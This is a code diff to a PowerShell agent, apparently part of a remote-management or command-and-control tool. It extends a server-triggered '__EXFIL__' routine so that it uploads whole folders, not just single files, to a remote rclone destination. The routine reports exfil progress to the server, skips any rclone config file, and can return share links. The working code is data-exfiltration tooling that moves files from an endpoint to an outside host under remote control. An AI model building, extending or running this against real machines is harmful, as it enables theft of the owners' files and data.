@@ -1173,11 +1173,24 @@ function Read-RmmRcloneJsonLogProgress {
     }
 }
 
-function Invoke-RmmRcloneCopytoWithProgress {
+function Get-RmmPathByteSize {
+    param([Parameter(Mandatory = $true)][string]$Path)
+    if (Test-Path -LiteralPath $Path -PathType Leaf) {
+        return [long](Get-Item -LiteralPath $Path).Length
+    }
+    $total = 0L
+    Get-ChildItem -LiteralPath $Path -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
+        $total += $_.Length
+    }
+    return $total
+}
+
+function Invoke-RmmRcloneTransferWithProgress {
     param(
         [Parameter(Mandatory = $true)][string]$RclonePath,
         [Parameter(Mandatory = $true)][string]$LocalPath,
         [Parameter(Mandatory = $true)][string]$RemoteTarget,
+        [Parameter(Mandatory = $true)][ValidateSet('copy', 'copyto')][string]$Mode,
         [Parameter(Mandatory = $true)][hashtable]$Context,
         [hashtable]$Headers = @{}
     )
@@ -1187,7 +1200,7 @@ function Invoke-RmmRcloneCopytoWithProgress {
     $readOffset = 0
     try {
         $argList = @(
-            'copyto', $LocalPath, $RemoteTarget,
+            $Mode, $LocalPath, $RemoteTarget,
             '--config', 'NUL',
             '--retries', '3',
             '--use-json-log',
@@ -1195,7 +1208,7 @@ function Invoke-RmmRcloneCopytoWithProgress {
             '--stats-log-level', 'NOTICE',
             '--log-file', $logFile
         )
-        Write-RmmLog "rclone copyto (progress) $LocalPath -> $RemoteTarget" -Level DEBUG
+        Write-RmmLog "rclone $Mode (progress) $LocalPath -> $RemoteTarget" -Level DEBUG
         $totalBytes = [long]$Context.total_bytes
         if ($totalBytes -gt 0) {
             Send-RmmTransferProgressResult -ResultType 'exfil_progress' -Payload @{
@@ -1211,7 +1224,7 @@ function Invoke-RmmRcloneCopytoWithProgress {
         }
         $proc = Start-RmmRcloneProcess -RclonePath $RclonePath -ArgumentList $argList
         if (-not $proc) {
-            throw 'Failed to start rclone copyto'
+            throw "Failed to start rclone $Mode"
         }
         while (-not $proc.HasExited) {
             Start-Sleep -Milliseconds 800
@@ -1228,7 +1241,7 @@ function Invoke-RmmRcloneCopytoWithProgress {
         if ($failed) {
             $codeText = if ($null -ne $exitCode) { [string]$exitCode } else { '?' }
             $detail = if ($logDetail) { $logDetail } else { '(no rclone log detail — check agent verbose or run rclone manually)' }
-            throw "rclone copyto failed (exit $codeText): $detail"
+            throw "rclone $Mode failed (exit $codeText): $detail"
         }
         $totalBytes = [long]$Context.total_bytes
         if ($totalBytes -gt 0) {
@@ -1247,6 +1260,18 @@ function Invoke-RmmRcloneCopytoWithProgress {
     }
 }
 
+function Invoke-RmmRcloneCopytoWithProgress {
+    param(
+        [Parameter(Mandatory = $true)][string]$RclonePath,
+        [Parameter(Mandatory = $true)][string]$LocalPath,
+        [Parameter(Mandatory = $true)][string]$RemoteTarget,
+        [Parameter(Mandatory = $true)][hashtable]$Context,
+        [hashtable]$Headers = @{}
+    )
+    Invoke-RmmRcloneTransferWithProgress -RclonePath $RclonePath -LocalPath $LocalPath `
+        -RemoteTarget $RemoteTarget -Mode 'copyto' -Context $Context -Headers $Headers
+}
+
 function Invoke-RmmRcloneExfil {
     param(
         [Parameter(Mandatory = $true)][string]$CommandLine,
@@ -1261,8 +1286,13 @@ function Invoke-RmmRcloneExfil {
     if (-not $localPath) {
         throw 'Missing local_path in __EXFIL__ payload'
     }
-    if (-not (Test-Path -LiteralPath $localPath -PathType Leaf)) {
-        $err = "File not found: $localPath"
+    $pathKind = $null
+    if (Test-Path -LiteralPath $localPath -PathType Leaf) {
+        $pathKind = 'file'
+    } elseif (Test-Path -LiteralPath $localPath -PathType Container) {
+        $pathKind = 'dir'
+    } else {
+        $err = "Path not found: $localPath"
         Send-RmmCloudUploadResult -Payload @{
             remote_path = $localPath
             profile     = [string]$job.profile
@@ -1276,10 +1306,11 @@ function Invoke-RmmRcloneExfil {
         return @{ success = $false; error = $err; link = $null }
     }
 
-    $fileInfo = Get-Item -LiteralPath $localPath
+    $totalBytes = Get-RmmPathByteSize -Path $localPath
     $maxBytes = [long]$job.max_bytes
-    if ($maxBytes -gt 0 -and $fileInfo.Length -gt $maxBytes) {
-        $err = "File size $(Format-RmmByteSize $fileInfo.Length) exceeds exfil limit ($(Format-RmmByteSize $maxBytes); set RMM_RCLONE_MAX_BYTES=0 on server for unlimited)"
+    if ($maxBytes -gt 0 -and $totalBytes -gt $maxBytes) {
+        $kindLabel = if ($pathKind -eq 'dir') { 'Folder size' } else { 'File size' }
+        $err = "$kindLabel $(Format-RmmByteSize $totalBytes) exceeds exfil limit ($(Format-RmmByteSize $maxBytes); set RMM_RCLONE_MAX_BYTES=0 on server for unlimited)"
         Send-RmmCloudUploadResult -Payload @{
             remote_path = $localPath
             profile     = [string]$job.profile
@@ -1287,7 +1318,7 @@ function Invoke-RmmRcloneExfil {
             success     = $false
             link        = $null
             dest        = [string]$job.dest
-            size        = [long]$fileInfo.Length
+            size        = $totalBytes
             error       = $err
         } -Headers $Headers
         return @{ success = $false; error = $err; link = $null }
@@ -1298,6 +1329,7 @@ function Invoke-RmmRcloneExfil {
     $remoteName = if ($job.remote_name) { [string]$job.remote_name } else { 'RMM' }
     $dest = [string]$job.dest
     $remoteTarget = "${remoteName}:${dest}"
+    $rcloneMode = if ($pathKind -eq 'dir') { 'copy' } else { 'copyto' }
 
     $skipObscure = @()
     if ($job.env_skip_obscure) {
@@ -1317,16 +1349,16 @@ function Invoke-RmmRcloneExfil {
     $progressContext = @{
         remote_path = $localPath
         profile     = [string]$job.profile
-        total_bytes = [long]$fileInfo.Length
+        total_bytes = $totalBytes
     }
 
     try {
-        Write-RmmLog "rclone copyto $localPath -> $remoteTarget ($($fileInfo.Length) bytes)" -Level DEBUG
-        Invoke-RmmRcloneCopytoWithProgress -RclonePath $rclonePath -LocalPath $localPath -RemoteTarget $remoteTarget `
-            -Context $progressContext -Headers $Headers
+        Write-RmmLog "rclone $rcloneMode $localPath -> $remoteTarget ($(Format-RmmByteSize $totalBytes))" -Level DEBUG
+        Invoke-RmmRcloneTransferWithProgress -RclonePath $rclonePath -LocalPath $localPath -RemoteTarget $remoteTarget `
+            -Mode $rcloneMode -Context $progressContext -Headers $Headers
 
         $link = $null
-        if ($job.link_command) {
+        if ($job.link_command -and $pathKind -eq 'file') {
             $linkOut = & $rclonePath link $remoteTarget --config NUL 2>&1
             if ($LASTEXITCODE -eq 0) {
                 $link = ($linkOut | Select-Object -Last 1).ToString().Trim()
@@ -1340,8 +1372,9 @@ function Invoke-RmmRcloneExfil {
             success     = $true
             link        = $link
             dest        = $dest
-            size        = [long]$fileInfo.Length
+            size        = $totalBytes
             error       = $null
+            path_kind   = $pathKind
         } -Headers $Headers
         return @{ success = $true; error = $null; link = $link }
     } catch {
@@ -1353,8 +1386,9 @@ function Invoke-RmmRcloneExfil {
             success     = $false
             link        = $null
             dest        = $dest
-            size        = [long]$fileInfo.Length
+            size        = $totalBytes
             error       = $err
+            path_kind   = $pathKind
         } -Headers $Headers
         return @{ success = $false; error = $err; link = $null }
     } finally {
